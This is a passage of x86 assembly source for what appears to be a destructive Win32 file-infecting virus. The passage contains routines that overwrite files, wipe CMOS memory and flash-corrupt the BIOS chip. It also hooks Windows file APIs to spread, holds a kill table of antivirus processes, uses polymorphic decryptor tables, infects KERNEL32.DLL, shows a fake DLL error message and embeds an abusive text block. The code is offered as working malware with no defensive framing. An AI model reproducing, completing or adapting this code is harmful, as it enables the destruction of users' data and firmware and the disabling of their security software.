		PUSH    ixGetFileSize
		INT     03h

                ; K, time to say ur prares..

                PUSH    EBX                     ; Nuke the S.O.B.
                CALL    @15
                DD      0DEADBEEFh
@15:            PUSH    EAX
                PUSH    444444h
                PUSH    ESI
                PUSH    ixWriteFile
                INT     03h

                ; Wasted, time to seal the tomb..

		PUSH    ESI
		PUSH    ixCloseHandle
		INT     03h

Find_Next_Crap: PUSH    ESP
		PUSH    EDI
		PUSH    ixFindNextFileA
		INT     03h

		DEC     EAX
		JZ      Destroy_Loop

Close_Find:     PUSH    EDI                     ; Close filehandle.
		PUSH    ixFindClose
		INT     03h

                LEA     EAX, [ESP+318]          ; Restore original directory.
		PUSH    EAX
		PUSH    ixSetCurrentDirectoryA
		INT     03h

Exit_Trash_Dir: ADD     ESP, (318+260+2)        ; Clean-up our stackspace.

		POPAD

		RET



;-------------------------------------------------------
; Overwrite CMOS and attempt to flash the BIOS chipset.
;-------------------------------------------------------
Ring0_Handler:
		PUSHFD
		PUSHAD

		CLI

		MOV     CL, 64                  ; Take all 64 bytes of CMOS.

Nuke_CMOS_Byte: DEC     CL                      ; We've did 'em all?
		JS      Nuke_BIOS

		MOV     AL, CL                  ; Request I/O to byte CL.
		OUT     70h, AL

		XOR     AL, AL                  ; Trash the byte.
		OUT     71h, AL

		JMP     Nuke_CMOS_Byte          ; Repeat until all is done.

        ; The CIH BIOS-flasher should work on every Intel-board
        ; out there, which are becoming increasingly common.
        ; I have fully commented Pascal sources of how to flash
        ; Intel and other boards, available on request.

Nuke_BIOS:      ; Show BIOS Page in 000E0000 - 000EFFFF (64k).

		MOV     EDI, 8000384Ch
		MOV     BP, 0CF8h
		MOV     DX, 0CFEh
		CALL    IOForEEPROM

		; Show BIOS Page in 000F0000 - 000FFFFF (64k).

		MOV     DI, 0058h
		DEC     EDX
		MOV     WORD PTR [EBP+(Switch-START)], 0F24h    ; AND AL, 0Fh
		CALL    IOForEEPROM

; ***********************
; * Show the BIOS Extra *
; * ROM Data in Memory  *
; * 000E0000 - 000E01FF *
; *   (   512 Bytes   ) *
; * , and the Section   *
; * of Extra BIOS can   *
; * be Writted...       *
; ***********************

		MOV     EAX, 0E5555h
		MOV     ECX, 0E2AAAh
		CALL    EnableEEPROMToWrite

		MOV     BYTE PTR [EAX], 60h

		PUSH    ECX

		LOOP    $

        ; Destroy BIOS Extra ROM Data in 000E0000h - 000E007Fh, (80h bytes).

		XOR     AH, AH
                MOV     WORD PTR [EAX], 'RI'    ; Dare yew go TU :P

		XCHG    ECX, EAX

		LOOP    $

; ***********************
; * Show and Enable the *
; * BIOS Main ROM Data  *
; * 000E0000 - 000FFFFF *
; *   (   128 KB   )    *
; * can be Writted...   *
; ***********************

		MOV     EAX, 0F5555h
		POP     ECX
		MOV     CH, 0AAh
		CALL    EnableEEPROMToWrite

		MOV     BYTE PTR [EAX], 20h

		LOOP    $

        ; Destroy BIOS Main ROM Data in 000FE000h - 000FE07Fh (80h bytes).

		MOV     AH, 0E0h
		MOV     [EAX], AL

		; Hide BIOS Page in 000F0000 - 000FFFFF (64k).

		MOV     WORD PTR [EBP+(Switch-START)], 100Ch    ; or al,10h
		CALL    IOForEEPROM

		POPAD
		POPFD

		IRETD


; Enable EEPROM to Write.
EnableEEPROMToWrite:

		MOV     [EAX], CL
		MOV     [ECX], AL

		MOV     BYTE PTR [EAX], 80h
		MOV     [EAX], CL
		MOV     [ECX], AL

		RET



; I/O for EEPROM.
IOForEEPROM:
		XCHG    EDI, EAX
		XCHG    EDX, EBP
		OUT     DX, EAX

		XCHG    EDI, EAX
		XCHG    EDX, EBP
		IN      AL, DX

		OR      AL, 44h
Switch          =       WORD PTR $-2

		XCHG    EDI, EAX
		XCHG    EDX, EBP
		OUT     DX, EAX

		XCHG    EDI, EAX
		XCHG    EDX, EBP
		OUT     DX, AL

		RET


; Returns random number between 0 and EAX-1.
Get_Random:
		PUSHAD

		XCHG    EBX, EAX

		PUSH    ixGetTickCount
		INT     03h

		RCL     EAX, 2

		ADD     EAX, 12345678h
Random_Seed     =       DWORD PTR $-4

		ADC     EAX, ESP

		XOR     EAX, ECX

		XOR     [EBP+(Random_Seed-START)], EAX

		ADD     EAX, [ESP-(13*4)]

		RCL     EAX, 1

		XOR     EDX, EDX
		DIV     EBX

		ADD     [EBP+(Random_Seed-START)], EDX

		MOV     [ESP+(7*4)], EDX

		POPAD

		OR      EAX, EAX

		RET


KERNEL32_Name   DB      '\KERNEL32.DLL', 0

Infected_K32    DB      '\KRIZED.TT6', 0

API_Addresses:  DD      (Work_API_Count + Hook_API_Count) DUP(0)

Hook_Exports:   DD      Hook_API_Count DUP(0)


;                       EAX   EBX   ECX   EDX   ESI   EDI   EBP
ADD_Reg32:      DB      0C0h, 0C3h, 0C1h, 0C2h, 0C6h, 0C7h, 0C5h
POP_Reg32:      DB      058h, 05Bh, 059h, 05Ah, 05Eh, 05Fh, 05Dh
DEC_Reg32:      DB      048h, 04Bh, 049h, 04Ah, 04Eh, 04Fh, 04Dh
MOV_Reg32:      DB      0B8h, 0BBh, 0B9h, 0BAh, 0BEh, 0BFh, 0BDh
XOR_Ptr_Reg32   DB      0B0h, 0B3h, 0B1h, 0B2h, 0B6h, 0B7h, 0B5h
PUSH_Reg32:     DB      050h, 053h, 051h, 052h, 056h, 057h, 055h
;                       ESP   CS    DS    ES    SS    FLAGS
PUSH_Reg16_32   DB      054h, 00Eh, 01Eh, 006h, 016h, 09Ch


; API which we hook in order to intercept file-access.

Hook_API_CRC:   CRC16   <CopyFileA>
		CRC16   <CreateFileA>
		CRC16   <CreateProcessA>
		CRC16   <DeleteFileA>
		CRC16   <GetFileAttributesA>
		CRC16   <MoveFileA>
		CRC16   <MoveFileExA>
		CRC16   <SetFileAttributesA>

		CRC16   <CopyFileW>
		CRC16   <CreateFileW>
		CRC16   <CreateProcessW>
		CRC16   <DeleteFileW>
		CRC16   <GetFileAttributesW>
		CRC16   <MoveFileW>
		CRC16   <MoveFileExW>
		CRC16   <SetFileAttributesW>

; API which we need in order to function.

Work_API_CRC:   CRC16   <CloseHandle>
		CRC16   <CreateFileMappingA>
		CRC16   <FindClose>
		CRC16   <FindFirstFileA>
		CRC16   <FindNextFileA>
		CRC16   <GetCurrentDirectoryA>
		CRC16   <GetDriveTypeA>
		CRC16   <GetFileSize>
		CRC16   <GetFileTime>
		CRC16   <GetLastError>
		CRC16   <GetLocalTime>
		CRC16   <GetLogicalDriveStringsA>
		CRC16   <GetProcAddress>
		CRC16   <GetSystemDirectoryA>
		CRC16   <GetTickCount>
		CRC16   <GetWindowsDirectoryA>
		CRC16   <GlobalAlloc>
		CRC16   <GlobalFree>
		CRC16   <LoadLibraryA>
		CRC16   <MapViewOfFile>
		CRC16   <SetCurrentDirectoryA>
		CRC16   <SetFileTime>
		CRC16   <UnmapViewOfFile>
		CRC16   <WriteFile>
		CRC16   <WritePrivateProfileStringA>

End_Work_API_CRC:


Dispatch_API:   ; ANSI.

		DW      (Hook_CopyFileA-START)
		DW      (Hook_CreateFileA-START)
		DW      (Hook_CreateProcessA-START)
		DW      (Hook_DeleteFileA-START)
		DW      (Hook_GetFileAttributesA-START)
		DW      (Hook_MoveFileA-START)
		DW      (Hook_MoveFileExA-START)
		DW      (Hook_SetFileAttributesA-START)

		; Unicode.

		DW      (Hook_CopyFileW-START)
		DW      (Hook_CreateFileW-START)
		DW      (Hook_CreateProcessW-START)
		DW      (Hook_DeleteFileW-START)
		DW      (Hook_GetFileAttributesW-START)
		DW      (Hook_MoveFileW-START)
		DW      (Hook_MoveFileExW-START)
		DW      (Hook_SetFileAttributesW-START)


; McAfee, AVP, NAV, and NOD-Ice.
Kill_Table:     CRC16   <_AVP32.EXE>
		CRC16   <_AVPCC.EXE>
		CRC16   <_AVPM.EXE>
		CRC16   <ALERTSVC.EXE>
		CRC16   <AMON.EXE>
		CRC16   <AVP32.EXE>
		CRC16   <AVPCC.EXE>
		CRC16   <AVPM.EXE>
		CRC16   <N32SCANW.EXE>
		CRC16   <NAVAPSVC.EXE>
		CRC16   <NAVAPW32.EXE>
		CRC16   <NAVLU32.EXE>
		CRC16   <NAVRUNR.EXE>
		CRC16   <NAVW32.EXE>
		CRC16   <NAVWNT.EXE>
		CRC16   <NOD32.EXE>
		CRC16   <NPSSVC.EXE>
		CRC16   <NRESQ32.EXE>
		CRC16   <NSCHED32.EXE>
		CRC16   <NSCHEDNT.EXE>
		CRC16   <NSPLUGIN.EXE>
		CRC16   <SCAN.EXE>
		CRC16   <SMSS.EXE>
End_Kill_Table:


	DB      'YOU CALL IT RELIGION, YOU''RE FULL OF SHIT', 0Dh
	DB      'YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL', 0Dh
	DB      'YOU''RE SO FULL OF SHIT, I DON''T WANT TO HEAR IT', 0Dh
	DB      'ALL YOU DO IS TALK ABOUT YOURSELF', 0Dh
	DB      'I DON''T WANNA HEAR IT, COZ I KNOW NONE OF IT''S TRUE', 0Dh
	DB      'I''M SICK AND TIRED OF ALL YOUR GODDAMN LIES', 0Dh
	DB      'LIES IN THE NAME OF GOD', 0Dh
	DB      'WHEN ARE YOU GOING TO REALIZE THAT I DON''T WANT TO HEAR IT?!', 0Dh
	DB      'I KNOW YOU''RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH', 0Dh
	DB      'YOU KEEP ON TALKING, TALKING EVERYDAY', 0Dh
	DB      'FIRST YOU''RE TELLING STORIES, THEN YOU''RE TELLING LIES', 0Dh
	DB      'WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON''T WANT TO HEAR IT!!', 0Dh
	DB      'AH, SHUT THE FUCK UP...', 0Dh, 0


Virus_End:

Kill_List_Drives        DB      256 DUP(0)

Net_Resource:

Clean_K32_Path          DB      260 DUP(0)
Infected_K32_Path       DB      260 DUP(0)

ANSI_Target_File        DB      260 DUP(0)

Time_Creation           DD      0
WNetOpenEnumA           DD      0
Time_Last_Access        DD      0
WNetEnumResourceA       DD      0
Time_Last_Write         DD      0
			DD      0

Local_Time              DW      8 DUP(0)

End_Heap:


Stupid_Dummy    DB      0


POLY_START:
		PUSH    EAX                     ; This is where the host's
						; VA address is placed.

		PUSHFD                          ; Save all registers & flags.
		PUSHAD

                CALL    @16                     ; Check for presence of my
                DB      'C:\VIRUS.TIR', 0       ; innoculation-file, as I
@16:            CALL    GetFileAttributesA      ; run Soft-Ice myself.

                INC     EAX                     ; Nah it ain't T, so let's
                JZ      START                   ; go for it.

                INT     01h                     ; Ack, we can't hurt daddy.

                NOP

                JMP     $

Carrier:
                PUSH    10h
                CALL    @17
                DB      'Error!', 0
@17:            CALL    @18
                DB      'Failed to initialize GRAPH32.DLL', 0
@18:            PUSH    0
                CALL    MessageBoxA

		PUSH    0                       ; Back to the beast...
		CALL    ExitProcess


; The good old MZ-header...

MZ_Header               STRUC
MZ_Mark                 DW      0
MZ_Image_Mod_512        DW      0
MZ_Image_512_Pages      DW      0
MZ_Reloc_Items          DW      0
MZ_Header_Size_Mem      DW      0
MZ_Min_Size_Mem         DW      0
MZ_Max_Size_Mem         DW      0
MZ_Program_SS           DW      0
MZ_Program_SP           DW      0
MZ_Checksum             DW      0
MZ_Program_IP           DW      0
MZ_Program_CS           DW      0
MZ_Reloc_Table          DW      0
MZ_Header               ENDS


PE_Header               STRUC
PE_Mark                 DD      0               ; PE-marker (PE/0/0).
CPU_Type                DW      0               ; Minimal CPU required.
Object_Count            DW      0               ; Number of sections in PE.
PE_Date_Time            DD      0               ; Date/time PE was build.
Reserved_1              DD      0
			DD      0
NT_Header_Size          DW      0
PE_Flags                DW      0
			DD      4 DUP(0)
EIP_RVA                 DD      0
			DD      2 DUP(0)
Image_Base              DD      0
Object_Align            DD      0
File_Align              DD      0
			DW      0, 0
			DW      0, 0
			DW      0, 0
PE_Reserved_5           DD      0
Image_Size              DD      0
Headers_Size            DD      0
PE_Checksum             DD      0
			DW      0
DLL_Flags               DW      0
PE_Header               ENDS


Section_Header          STRUC
Section_Name            DB      8 DUP(0)        ; Zero-padded section-name.
Section_Virtual_Size    DD      0               ; Memory-size of section.
Section_RVA             DD      0               ; Start section in memory.
Section_Physical_Size   DD      0               ; Section-size in file.
Section_Physical_Offset DD      0               ; Section file-offset.
Section_Reserved_1      DD      0               ; Not used for executables.
Section_Reserved_2      DD      0               ; Not used for executables.
Section_Reserved_3      DD      0               ; Not used for executables.
Section_Flags           DD      0               ; Flags of the section.
Section_Header          ENDS


Find_First_Next_Win32   STRUC
File_Attributes         DD      0
Creation_Time           DD      0, 0
Last_Accessed_Time      DD      0, 0
Last_Written_Time       DD      0, 0
Find_File_Size_High     DD      0
Find_File_Size_Low      DD      0
Find_Reserved_1         DD      0
Find_Reserved_2         DD      0
FFN_File_Name           DB      260 DUP(0)
Find_DOS_File_Name      DB      14 DUP(0)
Find_First_Next_Win32   ENDS


Date_Time               STRUC
Current_Year            DW      0
Current_Month           DW      0
Current_Day_Of_Week     DW      0
Current_Day             DW      0
Current_Hour            DW      0
Current_Minute          DW      0
Current_Second          DW      0
Current_Millisecond     DW      0
Date_Time               ENDS

		END     POLY_START
